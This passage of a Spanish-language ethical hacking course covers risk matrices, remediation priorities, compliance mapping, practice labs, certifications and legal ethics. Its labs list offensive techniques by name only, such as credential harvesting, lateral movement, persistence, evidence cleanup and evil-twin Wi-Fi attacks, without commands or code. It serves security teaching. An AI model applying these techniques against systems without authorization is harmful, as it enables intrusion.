High    │  Med   High   High  Critical │
Medium  │  Low   Med    High   High    │ Likelihood
Low     │  Low   Low    Med    High    │
Info    │  Info  Info   Low    Med     │
```

### Remediation Recommendations

#### Prioritization Framework
**Recommendation Categories:**
```
Remediation Priority Framework:
├── Critical (Fix Immediately)
│   ├── Active exploitation evidence
│   ├── Data breach potential
│   ├── System compromise risk
│   └── Regulatory compliance violations
├── High (Fix within 30 days)
│   ├── Privilege escalation paths
│   ├── Authentication bypasses
│   ├── Sensitive data exposure
│   └── Network segmentation failures
├── Medium (Fix within 90 days)
│   ├── Information disclosure
│   ├── Configuration weaknesses
│   ├── Outdated software versions
│   └── Logging deficiencies
├── Low (Fix within 6 months)
│   ├── Security hardening opportunities
│   ├── Best practice implementations
│   ├── Defense in depth improvements
│   └── Monitoring enhancements
└── Informational
    ├── Security awareness items
    ├── Process improvements
    └── Architecture considerations
```

### Compliance Mapping

#### Regulatory Framework Alignment
**Common Compliance Standards:**
```
Compliance Mapping:
├── PCI DSS Requirements
│   ├── Requirement 2: Default passwords
│   ├── Requirement 6: Secure development
│   ├── Requirement 8: Access management
│   └── Requirement 11: Security testing
├── NIST Cybersecurity Framework
│   ├── Identify (ID)
│   ├── Protect (PR)
│   ├── Detect (DE)
│   ├── Respond (RS)
│   └── Recover (RC)
├── ISO 27001 Controls
│   ├── A.12.6: Technical vulnerability management
│   ├── A.13.1: Network security management
│   ├── A.14.2: Security in development
│   └── A.18.2: Information security reviews
└── SOX Section 404
    ├── Internal control assessment
    ├── Management certification
    └── External auditor attestation
```

### Quality Assurance

#### Report Review Process
**Multi-stage Review:**
1. **Technical Review**: Vulnerability accuracy and exploitability
2. **Editorial Review**: Language, grammar, and clarity
3. **Management Review**: Business impact and recommendations
4. **Client Review**: Feedback incorporation and final approval

#### Deliverable Standards
**Report Quality Criteria:**
- Accurate technical findings
- Clear executive communication
- Actionable recommendations
- Comprehensive evidence documentation
- Professional presentation standards

## Objetivos de Aprendizaje
- [ ] Comprender la metodología de ethical hacking y sus principios éticos
- [ ] Dominar las etapas del proceso de penetration testing
- [ ] Utilizar herramientas especializadas (Kali Linux, Metasploit, Burp Suite)
- [ ] Realizar testing de seguridad en diferentes entornos (web, red, wireless)
- [ ] Desarrollar habilidades de social engineering ético
- [ ] Documentar hallazgos profesionalmente y generar reportes ejecutivos
- [ ] Aplicar principios éticos y legales en todas las actividades de testing
- [ ] Comprender diferentes metodologías (OWASP, PTES, NIST)
- [ ] Evaluar y priorizar riesgos de seguridad identificados
- [ ] Proporcionar recomendaciones de remediación efectivas

## Recursos Adicionales

### Laboratorios de Práctica
**Entornos de Aprendizaje:**
- **VulnHub**: Máquinas virtuales vulnerables para práctica
- **HackTheBox**: Plataforma de hacking ético online
- **TryHackMe**: Laboratorios guiados para principiantes
- **OverTheWire**: Wargames y desafíos de seguridad
- **DVWA**: Damn Vulnerable Web Application
- **WebGoat**: Aplicación web intencionalmente vulnerable
- **Mutillidae**: Plataforma de vulnerabilidades web

### Certificaciones Profesionales
**Certificaciones Recomendadas:**
```
Career Path Certifications:
├── Entry Level
│   ├── CompTIA Security+
│   ├── eJPT (eLearnSecurity Junior Penetration Tester)
│   └── GCIH (GIAC Certified Incident Handler)
├── Intermediate Level
│   ├── CEH (Certified Ethical Hacker)
│   ├── GPEN (GIAC Penetration Tester)
│   ├── CySA+ (CompTIA Cybersecurity Analyst)
│   └── GCFE (GIAC Certified Forensic Examiner)
├── Advanced Level
│   ├── OSCP (Offensive Security Certified Professional)
│   ├── CISSP (Certified Information Systems Security Professional)
│   ├── CISM (Certified Information Security Manager)
│   └── GREM (GIAC Reverse Engineering Malware)
└── Specialized
    ├── GWEB (GIAC Web Application Penetration Tester)
    ├── GMOB (GIAC Mobile Device Security Analyst)
    └── GCTI (GIAC Cyber Threat Intelligence)
```

### Comunidades y Conferencias
**Comunidades Profesionales:**
- **OWASP Local Chapters**: Grupos locales de seguridad web
- **2600 Meetings**: Reuniones de hackers éticos
- **DEF CON Groups**: Comunidades globales de hacking
- **BSides Events**: Conferencias locales de seguridad
- **ISACA Chapters**: Profesionales de auditoría y control

**Conferencias Importantes:**
- DEF CON (Las Vegas)
- Black Hat (Global)
- RSA Conference
- BSides (Local events)
- OWASP AppSec Conferences

### Recursos de Aprendizaje Continuo
**Documentación y Guías:**
- OWASP Testing Guide
- NIST Cybersecurity Framework
- SANS Reading Room
- CVE/CWE Databases
- Security blogs y podcasts

## Actividades Prácticas

### Laboratorio 1: Configuración de Entorno de Testing
**Objetivos:**
- Instalar y configurar Kali Linux
- Configurar máquinas virtuales de práctica
- Establecer entorno de red aislado
- Familiarizarse con herramientas básicas

**Pasos:**
1. Instalación de VirtualBox/VMware
2. Descarga e instalación de Kali Linux
3. Configuración de red NAT/Host-only
4. Instalación de máquinas vulnerables (Metasploitable, DVWA)
5. Verificación de conectividad

### Laboratorio 2: Reconnaissance y Scanning
**Objetivos:**
- Realizar reconocimiento pasivo y activo
- Utilizar herramientas de scanning
- Analizar resultados de enumeración

**Actividades:**
1. OSINT gathering con herramientas automáticas
2. Network discovery con Nmap
3. Service enumeration
4. Vulnerability scanning con OpenVAS
5. Análisis y documentación de hallazgos

### Laboratorio 3: Web Application Security Testing
**Objetivos:**
- Identificar vulnerabilidades OWASP Top 10
- Utilizar Burp Suite para testing manual
- Realizar ataques de injection
- Documentar vulnerabilidades encontradas

**Ejercicios:**
1. SQL Injection manual y con SQLMap
2. Cross-Site Scripting (XSS) testing
3. Authentication bypass attempts
4. Session management testing
5. Business logic flaw identification

### Laboratorio 4: Network Penetration Testing
**Objetivos:**
- Explotar vulnerabilidades de red
- Realizar post-exploitation activities
- Practicar movimiento lateral
- Establecer persistencia

**Tareas:**
1. Exploitation con Metasploit
2. Privilege escalation
3. Credential harvesting
4. Lateral movement techniques
5. Evidence cleanup

### Laboratorio 5: Wireless Security Assessment
**Objetivos:**
- Evaluar seguridad de redes WiFi
- Realizar ataques WPA/WPA2
- Crear rogue access points
- Testing de dispositivos Bluetooth

**Actividades:**
1. WiFi reconnaissance
2. WPA2 handshake capture y cracking
3. Evil twin setup
4. WPS PIN attacks
5. Bluetooth device scanning

### Proyecto Final: Comprehensive Penetration Test
**Entregables:**
1. **Reporte Ejecutivo** (2-3 páginas)
   - Resumen de hallazgos críticos
   - Impacto de negocio cuantificado
   - Recomendaciones estratégicas

2. **Reporte Técnico** (15-20 páginas)
   - Metodología utilizada
   - Hallazgos detallados con evidencia
   - Procedimientos de explotación
   - Recomendaciones técnicas específicas

3. **Presentación** (30 minutos)
   - Demo de vulnerabilidades críticas
   - Explicación de impacto de negocio
   - Plan de remediación propuesto

### Criterios de Evaluación
```
Evaluation Rubric:
├── Technical Proficiency (40%)
│   ├── Tool usage effectiveness
│   ├── Vulnerability identification accuracy
│   ├── Exploitation technique demonstration
│   └── Post-exploitation activities
├── Documentation Quality (30%)
│   ├── Report clarity and organization
│   ├── Evidence documentation
│   ├── Risk assessment accuracy
│   └── Remediation recommendation quality
├── Ethical Considerations (20%)
│   ├── Authorization compliance
│   ├── Scope adherence
│   ├── Data handling practices
│   └── Professional conduct
└── Communication Skills (10%)
    ├── Presentation effectiveness
    ├── Technical explanation clarity
    └── Executive summary quality
```

## Consideraciones Éticas y Legales

### Marco Legal Nacional e Internacional
**Legislación Relevante:**
- Ley de Protección de Datos Personales
- Código Penal - Delitos Informáticos
- Regulaciones sectoriales (financiero, salud, telecomunicaciones)
- Normativas internacionales (GDPR, HIPAA, PCI-DSS)

### Mejores Prácticas Profesionales
**Principios Fundamentales:**
1. **Autorización Explícita**: Nunca realizar testing sin autorización escrita
2. **Minimización de Daño**: Evitar interrupciones innecesarias del servicio
3. **Confidencialidad**: Proteger toda información accedida durante el testing
4. **Integridad**: Reportar todos los hallazgos de manera honesta y completa
5. **Profesionalismo**: Mantener estándares éticos en todas las interacciones

### Responsabilidades del Ethical Hacker
```
Professional Responsibilities:
├── Pre-Engagement
│   ├── Verificar autorización legal
│   ├── Definir alcance claramente
│   ├── Establecer reglas de engagement
│   └── Configurar canales de comunicación
├── During Testing
│   ├── Adherir estrictamente al alcance
│   ├── Documentar todas las actividades
│   ├── Reportar hallazgos críticos inmediatamente
│   └── Minimizar impacto operacional
├── Post-Engagement
│   ├── Limpiar artifacts de testing
│   ├── Entregar reporte completo
│   ├── Proporcionar support para remediación
│   └── Mantener confidencialidad a largo plazo
└── Ongoing
    ├── Mantenerse actualizado en técnicas
    ├── Participar en desarrollo profesional
    ├── Contribuir a la comunidad de seguridad
    └── Adherir a códigos de ética profesional
```
